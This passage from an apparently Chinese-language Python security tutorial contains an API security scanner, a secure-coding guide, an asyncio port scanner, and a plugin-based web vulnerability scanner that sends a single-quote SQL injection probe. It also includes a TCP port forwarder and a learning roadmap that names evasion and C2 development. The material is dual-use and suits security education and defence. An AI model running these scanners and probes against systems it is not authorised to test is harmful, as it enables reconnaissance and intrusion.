        for header, expected, severity in security_headers:
            if header not in resp.headers:
                issues.append((severity, f'缺少安全头: {header}'))

        return issues

    def _check_rate_limit(self, path, method, data):
        """速率限制检查（快速发送多个请求）"""
        issues = []
        url = f"{self.base_url}{path}"

        success_count = 0
        for _ in range(10):  # 快速发送 10 个请求
            try:
                if method.upper() == 'GET':
                    r = self.session.get(url, timeout=self.timeout)
                else:
                    r = self.session.post(url, json=data, timeout=self.timeout)
                if r.status_code == 200:
                    success_count += 1
            except:
                pass

        if success_count >= 8:  # 大部分都成功了，可能没有速率限制
            issues.append(('medium', '可能缺少速率限制（快速发送10个请求仍正常响应）'))

        return issues

    def scan_endpoints(self, endpoints):
        """扫描多个端点"""
        print(f"[*] API 安全扫描: {self.base_url}")
        print(f"[*] 目标端点: {len(endpoints)} 个\n")

        for endpoint in endpoints:
            path = endpoint.get('path', '/')
            method = endpoint.get('method', 'GET')
            data = endpoint.get('data')

            print(f"  检查: {method} {path}")
            issues = self.check_endpoint(path, method, data)

            if issues:
                for severity, desc in issues:
                    icon = {'high': '[!]', 'medium': '[!]', 'low': '[i]', 'info': '[i]'}[severity]
                    print(f"    {icon} {severity.upper()}: {desc}")
                    self.vulnerabilities.append({
                        'endpoint': path,
                        'method': method,
                        'severity': severity,
                        'description': desc
                    })
            else:
                print(f"    [-] 未发现问题")
            print()

        # 统计
        high = sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
        medium = sum(1 for v in self.vulnerabilities if v['severity'] == 'medium')
        low = sum(1 for v in self.vulnerabilities if v['severity'] == 'low')

        print(f"[*] 扫描完成")
        print(f"    高危: {high}  中危: {medium}  低危: {low}")

        return self.vulnerabilities


def main():
    parser = argparse.ArgumentParser(description='API 安全扫描器')
    parser.add_argument('url', help='API 基础 URL')
    parser.add_argument('-e', '--endpoints', help='端点列表文件 (JSON格式)')
    args = parser.parse_args()

    # 默认测试端点
    default_endpoints = [
        {'path': '/api/users', 'method': 'GET'},
        {'path': '/api/login', 'method': 'POST', 'data': {'username': 'test', 'password': 'test'}},
        {'path': '/api/admin', 'method': 'GET'},
        {'path': '/api/debug', 'method': 'GET'},
    ]

    endpoints = default_endpoints
    if args.endpoints:
        with open(args.endpoints) as f:
            endpoints = json.load(f)

    scanner = APISecurityScanner(args.url)
    scanner.scan_endpoints(endpoints)


if __name__ == '__main__':
    main()
```

### 3.1 Python 安全编码规范

```
===== 输入验证 =====

1. 所有外部输入必须验证
   - 来自用户、文件、网络、环境变量的数据都不可信
   - 白名单验证优于黑名单
   - 验证类型、长度、格式、范围

2. 常见验证方式
   - 正则表达式验证格式
   - 类型转换验证 (int(), float())
   - 白名单列表验证
   - 长度限制

3. 避免：
   - 不要信任客户端验证
   - 不要只做前端验证
   - 不要用 try/except 代替验证

===== 输出编码 =====

1. HTML 输出
   - 使用模板引擎自动转义
   - Jinja2: {{ user_input }} 自动转义
   - 避免 | safe 过滤器

2. SQL 查询
   - 使用参数化查询
   - 不要用字符串拼接 SQL
   - ORM 可以防止大部分注入

3. 命令执行
   - 避免使用 os.system / subprocess(shell=True)
   - 使用 subprocess 列表参数形式
   - 对用户输入严格白名单

4. URL/路径
   - 验证用户提供的路径
   - 防止路径遍历 (../)
   - 使用 os.path.abspath + 前缀检查

===== 密码安全 =====

1. 不要明文存储密码
   - 使用加盐哈希
   - 推荐: bcrypt, argon2, scrypt
   - 不要用 MD5/SHA1 存储密码

2. 示例代码：
   import bcrypt
   # 哈希
   hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
   # 验证
   bcrypt.checkpw(password.encode(), hashed)

===== 认证与会话 =====

1. 会话管理
   - 使用安全的会话 ID（足够随机）
   - 设置 HttpOnly、Secure、SameSite 属性
   - 会话过期机制
   - 登录后重新生成会话 ID

2. Cookie 安全属性
   Set-Cookie: session=xxx;
     HttpOnly;      # 防止 XSS 窃取
     Secure;        # 仅 HTTPS 传输
     SameSite=Lax;  # 防止 CSRF
     Path=/;
     Max-Age=3600

===== 文件上传安全 =====

1. 危险点：
   - 任意文件上传（上传 webshell）
   - 路径遍历（上传到任意位置）
   - 文件覆盖

2. 防护措施：
   - 验证文件类型（不要只看扩展名）
   - 随机化文件名
   - 存储在 web 根目录外
   - 设置正确的 MIME 类型
   - 限制文件大小
   - 使用单独的域名提供文件下载

===== 依赖安全 =====

1. 依赖管理
   - 定期更新依赖
   - 使用 pip-audit、safety 检查漏洞
   - 使用 requirements.txt / poetry.lock 锁定版本

2. 工具：
   pip-audit - 扫描依赖漏洞
   safety    - 检查已知漏洞
   Snyk      - 商业工具
   Dependabot - GitHub 自动更新

3. 命令：
   pip install pip-audit
   pip-audit

===== 错误处理 =====

1. 生产环境不要输出详细错误信息
   - 关闭 debug 模式
   - 自定义错误页面
   - 错误信息记录到日志，不要返回给用户

2. Flask/Django 配置
   DEBUG = False  (生产环境必须)
   配置 LOGGING 记录错误

===== 加密安全 =====

1. 不要自己实现加密算法
   - 使用标准库: cryptography
   - 不要用 ECB 模式
   - 使用经过验证的算法

2. 随机数安全
   - 敏感场景用 secrets 模块
   - 不要用 random 模块（不安全）
   - secrets.token_hex(32) 生成令牌

3. 推荐：
   from cryptography.fernet import Fernet
   key = Fernet.generate_key()
   f = Fernet(key)
   encrypted = f.encrypt(b"secret data")
   decrypted = f.decrypt(encrypted)
```

### 4.1 异步端口扫描器（asyncio）

使用 asyncio 实现高性能异步端口扫描，比传统多线程快 10 倍以上。

```python
import asyncio
from typing import List, Tuple

async def port_scan(host: str, port: int, timeout: float = 1.0) -> Tuple[int, bool]:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return (port, True)
    except:
        return (port, False)

async def scan_ports(host: str, ports: List[int], concurrency: int = 100) -> List[int]:
    semaphore = asyncio.Semaphore(concurrency)
    open_ports = []
    
    async def scan_with_sem(port):
        async with semaphore:
            return await port_scan(host, port)
    
    tasks = [scan_with_sem(p) for p in ports]
    results = await asyncio.gather(*tasks)
    
    for port, is_open in results:
        if is_open:
            open_ports.append(port)
    
    return sorted(open_ports)

# 使用示例
async def main():
    host = "127.0.0.1"
    ports = list(range(1, 10000))
    open_ports = await scan_ports(host, ports, concurrency=500)
    print(f"开放端口: {open_ports}")

if __name__ == "__main__":
    asyncio.run(main())
```

### 4.2 Web 漏洞扫描器框架

模块化的 Web 漏洞扫描器，支持插件扩展。

```python
import requests
from urllib.parse import urlparse
from dataclasses import dataclass
from typing import List, Callable

@dataclass
class Vulnerability:
    name: str
    severity: str
    url: str
    description: str
    evidence: str = ""

class WebScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (compatible; WebScanner/1.0)"
        })
        self.vulns: List[Vulnerability] = []
        self.plugins: List[Callable] = []
    
    def register_plugin(self, plugin_func):
        self.plugins.append(plugin_func)
    
    def scan(self):
        for plugin in self.plugins:
            try:
                results = plugin(self.base_url, self.session)
                if results:
                    self.vulns.extend(results)
            except Exception as e:
                print(f"插件 {plugin.__name__} 执行失败: {e}")
        return self.vulns

# 插件示例：SQL 注入检测
def sqli_plugin(base_url: str, session: requests.Session) -> List[Vulnerability]:
    vulns = []
    test_urls = [
        f"{base_url}/page?id=1'",
    ]
    errors = ["MySQL syntax", "SQL syntax", "ORA-", "PostgreSQL", "Warning: mysql_"]
    
    for url in test_urls:
        try:
            resp = session.get(url, timeout=5)
            for err in errors:
                if err.lower() in resp.text.lower():
                    vulns.append(Vulnerability(
                        name="SQL Injection",
                        severity="critical",
                        url=url,
                        description=f"检测到 SQL 错误: {err}",
                        evidence=err
                    ))
                    break
        except:
            pass
    return vulns

# 使用示例
scanner = WebScanner("http://target.com")
scanner.register_plugin(sqli_plugin)
results = scanner.scan()
for v in results:
    print(f"[{v.severity.upper()}] {v.name} - {v.url}")
```

### 4.4 代理与隧道工具

HTTP 代理和端口转发实现。

```python
import socket
import threading
import select
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request

# 端口转发
class PortForwarder:
    def __init__(self, local_port: int, remote_host: str, remote_port: int):
        self.local_port = local_port
        self.remote_host = remote_host
        self.remote_port = remote_port
    
    def forward(self, client_sock):
        try:
            remote_sock = socket.create_connection(
                (self.remote_host, self.remote_port), timeout=10
            )
            sockets = [client_sock, remote_sock]
            while True:
                readable, _, _ = select.select(sockets, [], [], 60)
                for sock in readable:
                    data = sock.recv(4096)
                    if not data:
                        return
                    if sock is client_sock:
                        remote_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
        except Exception as e:
            print(f"转发错误: {e}")
        finally:
            client_sock.close()
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.local_port))
        server.listen(100)
        print(f"端口转发: 0.0.0.0:{self.local_port} -> {self.remote_host}:{self.remote_port}")
        while True:
            client, addr = server.accept()
            t = threading.Thread(target=self.forward, args=(client,), daemon=True)
            t.start()
```

### 5.8 进阶学习路线

**第 1 阶段：基础夯实（1-2月）**
- 熟练掌握 Python 进阶语法（装饰器、生成器、上下文管理器、元类）
- 掌握常用标准库和第三方库
- 学习 HTTP 协议、TCP/IP 协议栈

**第 2 阶段：工具开发（2-3月）**
- 开发端口扫描器、目录爆破、SQL 注入检测等基础工具
- 学习多线程、多进程、异步编程
- 掌握爬虫开发、数据包分析

**第 3 阶段：漏洞利用（3-4月）**
- 深入理解 Web 漏洞原理
- 编写漏洞 PoC 和 EXP
- 学习密码学和加密绕过技巧

**第 4 阶段：红队技术（持续）**
- 学习内网渗透、横向移动
- 研究免杀技术、权限提升
- 了解 C2 框架开发

**第 5 阶段：CTF 实战（持续）**
- 参加 CTF 比赛积累经验
- 研究各类 CTF 题型
- 学习逆向工程、PWN、密码学
